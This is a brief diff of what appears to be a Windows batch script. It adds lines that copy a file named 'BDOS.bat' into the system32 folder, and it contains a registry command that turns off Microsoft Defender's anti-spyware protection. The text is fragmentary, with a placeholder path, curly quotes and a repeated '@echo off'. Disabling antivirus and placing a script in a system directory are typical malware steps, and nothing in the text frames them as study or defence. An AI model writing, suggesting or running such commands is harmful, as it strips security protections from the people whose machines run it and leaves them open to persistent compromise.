@@ -1,3 +1,5 @@
+@echo off
+copy "%~dp0BDOS.bat" "c:\\windows\system32"
 reg add “HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender” /v DisableAntiSpyware /t REG_DWORD /d 1 /f .
 C:\PATH\TO\FOLDER\BATCH-NAME.bat
 @echo off
